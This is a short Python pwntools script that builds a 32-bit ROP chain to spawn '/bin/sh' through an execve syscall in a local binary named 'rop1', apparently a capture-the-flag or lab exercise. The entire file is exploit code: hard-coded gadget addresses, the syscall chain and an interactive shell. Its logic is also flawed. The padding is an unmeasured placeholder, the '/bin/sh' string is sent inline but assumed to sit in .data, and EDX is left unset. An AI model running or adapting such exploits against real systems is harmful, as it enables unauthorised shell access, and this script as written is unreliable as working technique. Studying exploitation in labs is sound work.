#!/usr/bin/env python3
from pwn import *

# Target settings
context.arch = 'i386'
context.log_level = 'debug'

# Gadget addresses from binary
POP_EAX = 0x0804919a
POP_EBX = 0x0804901e
POP_ECX = 0x080491a4
INT_80  = 0x080491b4

# We'll store /bin/sh in .data section
BINSH_ADDR = 0x0804c010  # .data section from readelf

def build_rop_chain():
    # Initial padding - we'll use pattern to find exact offset
    rop = cyclic(100)
    
    # Add shell command to .data section
    rop += b"/bin/sh\x00"
    
    # ROP chain
    rop += p32(POP_EAX)
    rop += p32(0xb)          # execve syscall number
    rop += p32(POP_EBX)
    rop += p32(BINSH_ADDR)   # pointer to "/bin/sh"
    rop += p32(POP_ECX)
    rop += p32(0)            # argv = NULL
    rop += p32(INT_80)       # execute syscall

    return rop

def main():
    # Start the process
    p = process('./rop1')
    
    # Send our payload
    payload = build_rop_chain()
    print(f"Payload length: {len(payload)}")
    p.sendline(payload)
    
    # Switch to interactive mode
    p.interactive()

if __name__ == "__main__":
    main()
